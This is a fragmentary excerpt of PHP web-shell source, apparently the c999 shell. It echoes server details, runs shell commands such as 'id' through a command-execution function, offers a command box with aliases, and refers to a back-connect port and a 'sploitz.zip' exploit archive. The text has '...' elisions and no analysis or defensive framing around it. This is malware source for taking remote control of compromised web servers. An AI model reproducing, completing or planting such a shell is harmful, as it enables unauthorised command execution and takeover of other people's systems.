...
$ud = urlencode($d);
?><?php echo getenv("HTTP_HOST"); ?><?php echo $DISP_SERVER_SOFTWARE; ?><?php echo wordwrap(php_uname(),90,"<br>",1); ?><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?><?php echo $hsafemode; ?><?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
...
?><?php echo $surl; ?><?php echo urlencode($d); ?><?php echo $surl; ?><?php echo $surl;?><?php echo $surl;?><?php echo $bc_port; ?><?php echo $surl; ?><?php echo urlencode($d); ?><?php echo $surl; ?><?php echo $surl; ?><?php echo "$real/sploitz.zip"; ?><?php
...
echo("$emsg");
echo("</center>");
} ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo $surl; ?><?php echo $dispd; ?><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo wordwrap(php_uname()); ?><?php echo $surl; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $shver; ?><?php echo round(getmicrotime()-starttime,4); ?><?php chdir($lastdir); c999shexit(); ?>